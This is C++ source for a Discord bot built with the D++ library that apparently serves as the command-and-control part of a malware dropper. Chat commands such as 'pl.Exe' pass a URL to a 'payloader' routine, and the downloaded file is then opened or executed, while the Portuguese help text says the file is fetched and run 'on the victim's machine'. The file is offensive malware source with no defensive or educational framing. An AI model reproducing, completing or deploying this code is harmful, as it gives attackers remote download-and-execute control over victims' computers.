#include "../headers/curPipe_engine.hpp"
namespace curPipe {

    netWork::netWork(std::string token) 
    : bot(token, dpp::i_default_intents | dpp::i_message_content) { 
    bot.on_log(dpp::utility::cout_logger());
}


    netWork::~netWork(){

    }
    
    void netWork::readCommandsOnChat() {
        
        bot.on_message_create([this](const dpp::message_create_t& event) {
            if (event.msg.content.find(';') != std::string::npos) {
                try {
                    std::string nameOfFile = "default"; 
                    if (curPipe::findWordsOnString(event.msg.content, "pl.Png")) {
                        curPipe::payloader(curPipe::cleanWordsOnString(event.msg.content, "pl.Png", true), nameOfFile + ".png");
                        curPipe::openFiles(nameOfFile + ".png");
                    }
                    
                    if (curPipe::findWordsOnString(event.msg.content, "pl.Exe")) {
                        curPipe::payloader(curPipe::cleanWordsOnString(event.msg.content, "pl.Exe", true), nameOfFile + ".exe");
                        curPipe::openFiles(nameOfFile + ".exe");
                    }
                    
                    if (curPipe::findWordsOnString(event.msg.content, "pl.Gif")) {
                        curPipe::payloader(curPipe::cleanWordsOnString(event.msg.content, "pl.Gif", true), nameOfFile + ".gif");
                        curPipe::openFiles(nameOfFile + ".gif");
                    }

                    if (curPipe::findWordsOnString(event.msg.content, "pl.")) {
                        curPipe::payloader(curPipe::cleanWordsOnString(event.msg.content, "pl.", true), nameOfFile);
                        curPipe::openFiles(nameOfFile);
                    }

                    if (curPipe::findWordsOnString(event.msg.content, "help")){
						event.reply("pl.Png (use para fornecer um link de algum download direto para ser baixado e executado no formato depois do '.' na maquina da vitima) \n");
						event.reply("pl.Exe (use para fornecer um link de algum download direto para ser baixado e executado no formato depois do '.' na maquina da vitima) \n");
						event.reply("pl.Gif (use para fornecer um link de algum download direto para ser baixado e executado no formato depois do '.' na maquina da vitima) \n");
                        event.reply("pl. (use para fornecer um link de algum download direto para ser baixado e executado no formato depois do '.' na maquina da vitima) \n");
					}
                } catch (const std::exception& e) {
                    std::cerr << "Erro: " << e.what() << std::endl;
                }
            }
        });
    }





    void netWork::perfomBot(){
        bot.start(dpp::st_wait);
    }
}
    
